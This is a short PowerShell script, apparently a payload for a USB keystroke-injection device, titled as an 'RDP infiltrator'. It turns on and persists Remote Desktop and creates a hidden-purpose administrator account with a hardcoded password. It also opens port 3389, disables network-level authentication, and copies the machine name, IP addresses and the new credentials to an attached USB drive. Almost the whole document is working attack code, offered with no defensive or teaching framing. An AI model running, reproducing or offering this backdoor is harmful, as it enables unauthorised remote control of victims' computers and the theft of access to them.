# DUCKY RDP INFULTRETOR!

# ducky script commands:

# REM  create constent remote rdp , create a user with admin rights and send the data of the pc with user creds  to a usb 
# mass storage device that is connected

Set-Service -Name TermService -StartupType Automatic
Start-Service TermService
$Username = "hacktheworld"
$Password = "P@ssw0rd"
$SecurePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
New-LocalUser -Name $Username -Password $SecurePassword -Description "New User with Admin Rights"
Add-LocalGroupMember -Group "Administrators" -Member $Username
New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
$IPAddress = Get-NetIPAddress | Where-Object { $_.InterfaceAlias -ne "Loopback Pseudo-Interface 1" } | Select-Object -ExpandProperty IPAddress
$InterfaceName = Get-NetIPAddress | Where-Object { $_.InterfaceAlias -ne "Loopback Pseudo-Interface 1" } | Select-Object -ExpandProperty InterfaceAlias
$ComputerName = $env:COMPUTERNAME
$USBDrive = Get-WmiObject Win32_Volume | Where-Object { $_.DriveLetter -ne $null -and $_.DriveType -eq 2 } | Select-Object -First 1

if ($USBDrive) { 
    $OutputFile = "$($USBDrive.Name)\ComputerDetails.txt"
    "Computer Name: $ComputerName" | Out-File $OutputFile
    "IP Addresses: " | Out-File $OutputFile -Append
    for ($i = 0; $i -lt $IPAddress.Count; $i++) {
        "`t$($InterfaceName[$i]): $($IPAddress[$i])" | Out-File $OutputFile -Append
    }
    "Username: $Username" | Out-File $OutputFile -Append
    "Password: $Password" | Out-File $OutputFile -Append
  

Write-Host "Computer details saved to $($USBDrive.Name)\ComputerDetails.txt"
} else {
    Write-Host "USB mass storage device not found."
}





